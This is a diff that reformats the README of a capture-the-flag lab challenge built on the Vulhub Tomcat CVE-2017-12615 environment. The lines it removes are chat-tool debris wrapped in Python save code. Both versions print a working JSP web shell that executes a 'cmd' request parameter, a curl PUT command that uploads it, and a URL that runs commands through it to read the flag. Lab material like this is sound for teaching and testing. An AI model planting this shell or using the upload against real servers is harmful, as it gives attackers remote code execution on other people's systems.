@@ -1,19 +1,22 @@
-# Recreate README.md for Challenge 7
-
-challenge_7_readme = """# Challenge 7: Tom & Jerry
+# Challenge 7: Tom & Jerry
 
 ## How to Start
 ```bash
 docker compose pull
 docker compose up -d
-Description
-This challenge demonstrates how to upload a malicious payload to a vulnerable Apache Tomcat server in order to gain remote shell access.
-Solution
-1. Create shell.jsp
-jsp
-Always show details
+```
 
-Copy code
+---
+
+## Description
+This challenge demonstrates how to upload a malicious payload to a vulnerable Apache Tomcat server in order to gain **remote shell access**.
+
+---
+
+## Solution
+
+### 1. Create `shell.jsp`
+```jsp
 <% 
   if(request.getParameter("cmd") != null) {
     String cmd = request.getParameter("cmd");
@@ -27,75 +30,60 @@ Copy code
     out.println(output);
   }
 %>
-2. Upload the Payload
-bash
-Always show details
+```
 
-Copy code
+### 2. Upload the Payload
+```bash
 curl -v -X PUT "http://localhost:8010/shell.jsp/" --data-binary "@shell.jsp" -H "Content-Type: application/octet-stream"
-3. Access the Web Shell
+```
+
+### 3. Access the Web Shell
 Once uploaded, execute commands through the shell, for example, to retrieve the flag:
-
-bash
-Always show details
-
-Copy code
+```bash
 http://localhost:8010/shell.jsp?cmd=cat%20/usr/local/tomcat/webapps/ROOT/flag.txt
-Flag:
+```
 
-Always show details
-
-Copy code
+**Flag:**
+```
 Flag{tomcat_rce_success}
-How to Recreate
-1. Clone Vulhub Repository
-bash
-Always show details
+```
 
-Copy code
+---
+
+## How to Recreate
+
+### 1. Clone Vulhub Repository
+```bash
 git clone https://github.com/vulhub/vulhub
-2. Navigate to the Tomcat CVE Directory
-bash
-Always show details
+```
 
-Copy code
+### 2. Navigate to the Tomcat CVE Directory
+```bash
 cd vulhub/tomcat/CVE-2017-12615
-3. Build and Start the Container
-bash
-Always show details
+```
 
-Copy code
+### 3. Build and Start the Container
+```bash
 docker compose up -d
-4. Verify in Browser
+```
+
+### 4. Verify in Browser
 Visit:
-
-arduino
-Always show details
-
-Copy code
+```
 http://localhost:<port>
-5. Add the Flag
+```
+
+### 5. Add the Flag
 Enter the container:
-
-bash
-Always show details
-
-Copy code
+```bash
 docker exec -it <container_id> /bin/bash
+```
 Create the flag file:
-
-bash
-Always show details
-
-Copy code
+```bash
 echo "Flag{tomcat_rce_success}" > /usr/local/tomcat/webapps/ROOT/flag.txt
-Final Notes
+```
+
+---
+
+## Final Notes
 This challenge demonstrates the risk of improperly secured file upload mechanisms and outdated Tomcat configurations, which can allow attackers to upload and execute arbitrary code.
-"""
-
-Save file
-challenge_7_path = "/mnt/data/Challenge_7_README.md"
-with open(challenge_7_path, "w") as file:
-file.write(challenge_7_readme)
-
-challenge_7_path
